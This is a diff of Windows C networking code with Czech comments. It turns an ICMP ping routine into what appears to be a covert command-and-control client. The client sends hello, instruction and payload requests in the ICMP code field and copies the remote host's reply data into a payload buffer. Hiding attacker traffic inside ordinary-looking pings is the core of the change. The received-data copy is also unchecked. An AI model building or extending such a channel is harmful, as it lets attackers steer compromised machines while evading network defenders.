@@ -9,7 +9,7 @@
 int PostRecvfrom(SOCKET s, char* buf, int buflen, SOCKADDR* from, int* fromlen, WSAOVERLAPPED* ol) {
 	WSABUF	wbuf;
 	DWORD   flags,bytes;
-	int	rc;
+	INT	rc;
 
 	wbuf.buf = buf;
 	wbuf.len = buflen;
@@ -26,23 +26,9 @@ int PostRecvfrom(SOCKET s, char* buf, int buflen, SOCKADDR* from, int* fromlen, 
 	return NO_ERROR;
 }
 
-char *GetPayload(char* buf, int bytes)
-{
-	IPV4_HDR* iphdr = NULL;
-	ICMP_HEADER* icmphdr = NULL;
-
-	iphdr = (IPV4_HDR*)(buf );
-	icmphdr = (ICMP_HEADER*)(buf + sizeof(IPV4_HDR));
-	int hdrlen = (iphdr->ip_verlen & 0x0F) * 4;
-	printf("\nCode %d\n", hdrlen);
-
-	return "";
-}
-
-
 struct addrinfo* ResolveAddress(char* addr, char* port, int af, int type, int proto) {
 	struct addrinfo hints,*res = NULL;
-	int rc;
+	INT rc;
 
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_flags = ((addr) ? 0 : AI_PASSIVE);
@@ -59,15 +45,17 @@ struct addrinfo* ResolveAddress(char* addr, char* port, int af, int type, int pr
 	return res;
 }
 
-int SendICMP(char *gDestination, REQUEST_TYPE request_type) {
+int SendICMP(LPSTR destination, INT datasize, REQUEST_TYPE request_type, RESPONSE_TYPE *response_type, LPSTR payload) {
 	WSADATA	wsd;
-	WSAOVERLAPPED recvol;
 	SOCKET s = INVALID_SOCKET;
-	char* icmpbuf = NULL;
-	struct addrinfo* dest = NULL, * local = NULL;
+	LPSTR icmpbuf = NULL;
 	SOCKADDR_STORAGE from;
 	DWORD bytes, flags;
-	int	packetlen = 0, fromlen,time = 0, rc, i, status = 0;
+	INT	packetlen = 0, fromlen,time = 0, rc, i, status = 0;
+
+	WSAOVERLAPPED recvol;
+	struct addrinfo* dest = NULL, * local = NULL;
+
 
 	recvol.hEvent = WSA_INVALID_EVENT;
 
@@ -80,10 +68,10 @@ int SendICMP(char *gDestination, REQUEST_TYPE request_type) {
 	}
 
 	// Cílová adresa
-	dest = ResolveAddress(gDestination, "0", AF_INET, 0, 0);
+	dest = ResolveAddress(destination, "0", AF_INET, 0, 0);
 	
 	if (dest == NULL) {
-		printf("bad name %s\n", gDestination);
+		printf("bad name %s\n", destination);
 		status = -1;
 		goto CLEANUP;
 	}
@@ -106,7 +94,7 @@ int SendICMP(char *gDestination, REQUEST_TYPE request_type) {
 	}
 
 	packetlen += sizeof(ICMP_HEADER);
-	packetlen += gDataSize;
+	packetlen += datasize;
 
 	icmpbuf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, packetlen);
 	if (icmpbuf == NULL) {
@@ -125,14 +113,14 @@ int SendICMP(char *gDestination, REQUEST_TYPE request_type) {
 
 	switch (request_type) {
 		default:
-		HELLO:
+		case GET_HELLO:
 			icmp_hdr->icmp_code = 0;
 			break;
 		// Pro ostatní jsou potøeba administrtorská práva :/
-		GET_INFORMATION:
+		case GET_INSTRUCTION:
 			icmp_hdr->icmp_code = 1;
 			break;
-		GET_PAYLOAD:
+		case GET_PAYLOAD:
 			icmp_hdr->icmp_code = 2;
 			break;
 	}
@@ -143,7 +131,7 @@ int SendICMP(char *gDestination, REQUEST_TYPE request_type) {
 
 	datapart = icmpbuf + sizeof(ICMP_HEADER);
 
-	memset(datapart, 'E', gDataSize);
+	memset(datapart, 'E', datasize);
 
 
 	rc = bind(s, local->ai_addr, (int)local->ai_addrlen);
@@ -161,50 +149,79 @@ int SendICMP(char *gDestination, REQUEST_TYPE request_type) {
 		goto CLEANUP;
 	}
 
+	char recvbuf[MAX_RECV_BUF_LEN];
+	int recvbuflen = MAX_RECV_BUF_LEN;
+
 	fromlen = sizeof(from);
 	PostRecvfrom(s, recvbuf, recvbuflen, (SOCKADDR*)&from, &fromlen, &recvol);
 
-	printf("\nPinging");
-	printf("with %d bytes of data\n\n", gDataSize);
+	printf("\nPinging with %d bytes of data\n\n", datasize);
 
-	for (i = 0; i < DEFAULT_SEND_COUNT; i++) {
-		ComputeIcmpChecksum(s, icmpbuf, packetlen, dest);
+	ComputeIcmpChecksum(s, icmpbuf, packetlen, dest);
 
-		time = GetTickCount64();
-		rc = sendto(s, icmpbuf, packetlen,0, dest->ai_addr, (int)dest->ai_addrlen);
+	time = GetTickCount64();
+	rc = sendto(s, icmpbuf, packetlen,0, dest->ai_addr, (int)dest->ai_addrlen);
+  
 
-		if (rc == SOCKET_ERROR) {
-			fprintf(stderr, "sendto failed: %d\n", WSAGetLastError());
-			status = -1;
-			goto CLEANUP;
+	if (rc == SOCKET_ERROR) {
+		fprintf(stderr, "sendto failed: %d\n", WSAGetLastError());
+		status = -1;
+		goto CLEANUP;
+	}
+
+	rc = WaitForSingleObject((HANDLE)recvol.hEvent, DEFAULT_RECV_TIMEOUT);
+	if (rc == WAIT_FAILED) {
+		fprintf(stderr, "WaitForSingleObject failed: %d\n", GetLastError());
+		status = -1;
+		goto CLEANUP;
+	}
+	else if (rc == WAIT_TIMEOUT) {
+		printf("Request timed out.\n");
+	}
+	else {
+		rc = WSAGetOverlappedResult(s, &recvol, &bytes, FALSE, &flags);
+		if (rc == FALSE) {
+			fprintf(stderr, "WSAGetOverlappedResult failed: %d\n", WSAGetLastError());
 		}
 
-		rc = WaitForSingleObject((HANDLE)recvol.hEvent, DEFAULT_RECV_TIMEOUT);
-		if (rc == WAIT_FAILED) {
-			fprintf(stderr, "WaitForSingleObject failed: %d\n", GetLastError());
-			status = -1;
-			goto CLEANUP;
-		}
-		else if (rc == WAIT_TIMEOUT) {
-			printf("Request timed out.\n");
-		}
-		else {
-			rc = WSAGetOverlappedResult(s, &recvol, &bytes, FALSE, &flags);
-			if (rc == FALSE) {
-				fprintf(stderr, "WSAGetOverlappedResult failed: %d\n", WSAGetLastError());
-			}
+		WSAResetEvent(recvol.hEvent);
 
-			WSAResetEvent(recvol.hEvent);
+		printf("Reply from: bytes=%d time<1ms TTL=%d\n", datasize, gTtl);
 
-			printf("Reply from");
-			printf(": bytes=%d time<1ms TTL=%d\n", gDataSize, gTtl);
+		fromlen = sizeof(from);
+		PostRecvfrom(s, recvbuf, recvbuflen, (SOCKADDR*)&from, &fromlen, &recvol);
+	}
 
-			if (i < DEFAULT_SEND_COUNT - 1) {
-				fromlen = sizeof(from);
-				PostRecvfrom(s, recvbuf, recvbuflen, (SOCKADDR*)&from, &fromlen, &recvol);
-			}
+	IPV4_HDR* iphdr = NULL;
+	ICMP_HEADER* icmphdr = NULL;
+
+	iphdr = (IPV4_HDR*)(recvbuf);
+	INT hdrlen = (iphdr->ip_verlen & 0x0F) * 4;
+	icmphdr = (ICMP_HEADER*)(recvbuf + sizeof(IPV4_HDR));
+	/*
+	Vypsání položky jako 8 bitù - 10111100 - Pro analýzu ve Wiresharku
+	for (size_t i = 0; i < 1; i++) {
+		for (int i = 7; 0 <= i; i--) {
+					printf("%c", (icmphdr->icmp_checksum & (1 << i)) ? '1' : '0');
 		}
-		Sleep(1000);
+		printf(" ");
+	}
+	*/
+	LPSTR payload_temp = (char*)(recvbuf + sizeof(IPV4_HDR) + sizeof(ICMP_HEADER));
+	
+	strncpy(payload, payload_temp, datasize);
+
+	switch (icmphdr->icmp_code) {
+		default:
+		case 0:
+			*response_type = RETURN_HELLO;
+			break;
+		case 1:
+			*response_type = RETRUN_INSTRUCTION;
+			break;
+		case 2:
+			*response_type = RETURN_PAYLOAD;
+			break;
 	}
 
 CLEANUP:
@@ -219,7 +236,6 @@ CLEANUP:
 	if (icmpbuf)
 		HeapFree(GetProcessHeap(), 0, icmpbuf);
 	WSACleanup();
-
 EXIT:
 	return status;
 }
